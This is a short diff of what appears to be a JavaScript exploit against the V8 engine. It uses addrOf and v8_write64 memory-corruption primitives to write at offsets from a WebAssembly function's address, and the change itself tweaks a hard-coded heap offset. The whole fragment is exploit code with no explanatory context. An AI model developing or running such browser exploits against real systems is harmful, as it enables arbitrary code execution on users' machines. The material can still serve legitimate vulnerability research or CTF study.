@@ -58,10 +58,10 @@ instance.exports.func0(0n);
 // 0x13n + 0xcn
 v8_write64(addrOf(instance.exports.func1)-0x30+0x18,0x1fn);
 console.log((heap_addr + 0x200000n).toString(16));
-let dummy = 1n;
+// let dummy = 1n;
 
 // 0x2001a9 - 0x38
-let offset_base = 0x200171n; // magic number...
+let offset_base = 0x200161n; // magic number...
 console.log("offset_base: 0x" + offset_base.toString(16));
 
 v8_write64(0x200000n + 0x20n, heap_addr + 0x250000n);
